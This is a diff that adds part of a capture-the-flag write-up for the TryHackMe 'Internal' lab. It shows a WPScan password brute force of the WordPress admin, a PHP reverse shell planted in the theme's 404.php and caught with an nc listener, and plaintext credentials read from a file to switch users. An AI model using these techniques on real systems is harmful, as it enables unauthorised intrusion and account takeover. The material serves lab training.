@@ -239,3 +239,244 @@ Interesting Finding(s):
  | [!] The version is out of date, the latest version is 3.0
  | Style URL: http://internal.thm/blog/wp-content/themes/twentyseventeen/style.css?ver=20190507
  | Style Name: Twenty Seventeen
+ | Style URI: https://wordpress.org/themes/twentyseventeen/
+ | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
+ | Author: the WordPress team
+ | Author URI: https://wordpress.org/
+ |
+ | Found By: Css Style In Homepage (Passive Detection)
+ |
+ | Version: 2.3 (80% confidence)
+ | Found By: Style (Passive Detection)
+ |  - http://internal.thm/blog/wp-content/themes/twentyseventeen/style.css?ver=20190507, Match: 'Version: 2.3'
+
+[+] Enumerating Users (via Passive and Aggressive Methods)
+ Brute Forcing Author IDs - Time: 00:00:01 <====================================> (10 / 10) 100.00% Time: 00:00:01
+
+[i] User(s) Identified:
+
+[+] admin
+ | Found By: Author Posts - Author Pattern (Passive Detection)
+ | Confirmed By:
+ |  Rss Generator (Passive Detection)
+ |  Wp Json Api (Aggressive Detection)
+ |   - http://internal.thm/blog/index.php/wp-json/wp/v2/users/?per_page=100&page=1
+ |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ |  Login Error Messages (Aggressive Detection)
+
+[!] No WPScan API Token given, as a result vulnerability data has not been output.
+[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
+
+[+] Finished: Wed Sep 28 12:08:39 2022
+[+] Requests Done: 54
+[+] Cached Requests: 7
+[+] Data Sent: 13.943 KB
+[+] Data Received: 472.771 KB
+[+] Memory used: 204.387 MB
+[+] Elapsed time: 00:00:16
+
+According to WPScan, the only user is admin. Let’s try to brute force the password, using the bruteforce feature of WPScan:
+```
+```text
+┌──(kali㉿kali)-[~]
+└─$ wpscan --url http://internal.thm/blog -U admin -P /usr/share/wordlists/rockyou.txt
+_______________________________________________________________
+         __          _______   _____
+         \ \        / /  __ \ / ____|
+          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
+            \  /\  /  | |     ____) | (__| (_| | | | |
+             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+         WordPress Security Scanner by the WPScan Team
+                         Version 3.8.22
+       Sponsored by Automattic - https://automattic.com/
+       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+_______________________________________________________________
+
+[i] It seems like you have not updated the database for some time.
+[?] Do you want to update now? [Y]es [N]o, default: [N]
+[+] URL: http://internal.thm/blog/ [10.10.97.105]
+[+] Started: Wed Sep 28 12:11:12 2022
+
+Interesting Finding(s):
+
+[+] Headers
+ | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
+ | Found By: Headers (Passive Detection)
+ | Confidence: 100%
+
+[+] XML-RPC seems to be enabled: http://internal.thm/blog/xmlrpc.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+ | References:
+ |  - http://codex.wordpress.org/XML-RPC_Pingback_API
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
+ |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
+
+[+] WordPress readme found: http://internal.thm/blog/readme.html
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] The external WP-Cron seems to be enabled: http://internal.thm/blog/wp-cron.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 60%
+ | References:
+ |  - https://www.iplocation.net/defend-wordpress-from-ddos
+ |  - https://github.com/wpscanteam/wpscan/issues/1299
+
+[+] WordPress version 5.4.2 identified (Insecure, released on 2020-06-10).
+ | Found By: Rss Generator (Passive Detection)
+ |  - http://internal.thm/blog/index.php/feed/, <generator>https://wordpress.org/?v=5.4.2</generator>
+ |  - http://internal.thm/blog/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.4.2</generator>
+
+[+] WordPress theme in use: twentyseventeen
+ | Location: http://internal.thm/blog/wp-content/themes/twentyseventeen/
+ | Last Updated: 2022-05-24T00:00:00.000Z
+ | Readme: http://internal.thm/blog/wp-content/themes/twentyseventeen/readme.txt
+ | [!] The version is out of date, the latest version is 3.0
+ | Style URL: http://internal.thm/blog/wp-content/themes/twentyseventeen/style.css?ver=20190507
+ | Style Name: Twenty Seventeen
+ | Style URI: https://wordpress.org/themes/twentyseventeen/
+ | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
+ | Author: the WordPress team
+ | Author URI: https://wordpress.org/
+ |
+ | Found By: Css Style In Homepage (Passive Detection)
+ |
+ | Version: 2.3 (80% confidence)
+ | Found By: Style (Passive Detection)
+ |  - http://internal.thm/blog/wp-content/themes/twentyseventeen/style.css?ver=20190507, Match: 'Version: 2.3'
+
+[+] Enumerating All Plugins (via Passive Methods)
+
+[i] No plugins Found.
+
+[+] Enumerating Config Backups (via Passive and Aggressive Methods)
+ Checking Config Backups - Time: 00:00:07 <===================================> (137 / 137) 100.00% Time: 00:00:07
+
+[i] No Config Backups Found.
+
+[+] Performing password attack on Xmlrpc against 1 user/s
+[SUCCESS] - admin / my2boys                                                                                       
+Trying admin / bratz1 Time: 00:06:34 <                                   > (3885 / 14348277)  0.02%  ETA: ??:??:??
+
+[!] Valid Combinations Found:
+ | Username: admin, Password: my2boys
+
+[!] No WPScan API Token given, as a result vulnerability data has not been output.
+[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
+
+[+] Finished: Wed Sep 28 12:18:11 2022
+[+] Requests Done: 4028
+[+] Cached Requests: 35
+[+] Data Sent: 2.033 MB
+[+] Data Received: 2.311 MB
+[+] Memory used: 281.613 MB
+[+] Elapsed time: 00:06:58
+
+admin:my2boys
+
+Wordpress admin connection
+
+Login (http://internal.thm/blog/wp-admin/) is successful with admin:my2boys and we now have the ability to modify the templates PHP source code. This will be convenient to write a reverse shell.
+
+In the web interface, go to “Appearance > Theme Editor > 404.php” and replace the PHP code with a PHP reverse shell (e.g. http://pentestmonkey.net/tools/web-shells/php-reverse-shell).
+
+Open a listener (rlwrap nc -nlvp 4444) and call the template (http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php). 
+
+internal.thm/blog/wp-content/themes/twentyseventeen/404.php
+
+rev shell
+```
+```text
+┌──(kali㉿kali)-[~]
+└─$ rlwrap nc -nlvp 4444                                
+Ncat: Version 7.92 ( https://nmap.org/ncat )
+Ncat: Listening on :::4444
+Ncat: Listening on 0.0.0.0:4444
+Ncat: Connection from 10.10.97.105.
+Ncat: Connection from 10.10.97.105:35004.
+Linux internal 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+ 16:23:30 up 35 min,  0 users,  load average: 0.01, 0.10, 0.09
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+
+Lateral move (www-data to aubreanna)
+
+There is an interesting file in the /opt directory: 
+
+www-data@internal:/$ whoami
+whoami
+www-data
+www-data@internal:/$ cd /opt
+cd /opt
+www-data@internal:/opt$ ls
+ls
+containerd  wp-save.txt
+www-data@internal:/opt$ cat wp-save.txt
+cat wp-save.txt
+Bill,
+
+Aubreanna needed these credentials for something later.  Let her know you have them and where they are.
+
+aubreanna:bubb13guM!@#123
+www-data@internal:/opt$ su aubreanna
+su aubreanna
+Password: bubb13guM!@#123
+
+aubreanna@internal:/opt$ whoami
+whoami
+aubreanna
+aubreanna@internal:/opt$ cd /home/aubreanna
+cd /home/aubreanna
+aubreanna@internal:~$ ls -la
+ls -la
+total 56
+drwx------ 7 aubreanna aubreanna 4096 Aug  3  2020 .
+drwxr-xr-x 3 root      root      4096 Aug  3  2020 ..
+-rwx------ 1 aubreanna aubreanna    7 Aug  3  2020 .bash_history
+-rwx------ 1 aubreanna aubreanna  220 Apr  4  2018 .bash_logout
+-rwx------ 1 aubreanna aubreanna 3771 Apr  4  2018 .bashrc
+drwx------ 2 aubreanna aubreanna 4096 Aug  3  2020 .cache
+drwx------ 3 aubreanna aubreanna 4096 Aug  3  2020 .gnupg
+drwx------ 3 aubreanna aubreanna 4096 Aug  3  2020 .local
+-rwx------ 1 root      root       223 Aug  3  2020 .mysql_history
+-rwx------ 1 aubreanna aubreanna  807 Apr  4  2018 .profile
+drwx------ 2 aubreanna aubreanna 4096 Aug  3  2020 .ssh
+-rwx------ 1 aubreanna aubreanna    0 Aug  3  2020 .sudo_as_admin_successful
+-rwx------ 1 aubreanna aubreanna   55 Aug  3  2020 jenkins.txt
+drwx------ 3 aubreanna aubreanna 4096 Aug  3  2020 snap
+-rwx------ 1 aubreanna aubreanna   21 Aug  3  2020 user.txt
+aubreanna@internal:~$ cat user.txt
+cat user.txt
+THM{int3rna1_fl4g_1}
+
+Check privileges
+
+To read the root flag, we will need a privilege escalation. Unfortunately, aubreanna is not in the sudoers. 
+
+aubreanna@internal:~$ sudo -l
+sudo -l
+[sudo] password for aubreanna: bubb13guM!@#123
+
+Sorry, user aubreanna may not run sudo on internal.
+
+Jenkins
+
+There is an interesting file in aubreanna’s home folder that tells us Jenkins is running on port 8080: 
+
+aubreanna@internal:~$ cat jenkins.txt
+cat jenkins.txt
+Internal Jenkins service is running on 172.17.0.2:8080
+
+We confirm that the service is only available to localhost. 
+
+aubreanna@internal:~$ netstat -tan | grep 8080
+netstat -tan | grep 8080
+tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN 
+
+There are several indications that docker is available on the target, and as the Jenkins documentation (https://www.jenkins.io/doc/book/installing/) explains how to install Jenkins with docker, we can assume that this is how Jenkins has been installed. If not a rabbit hole, this could be a way to elevate our privileges to root. Worth trying…
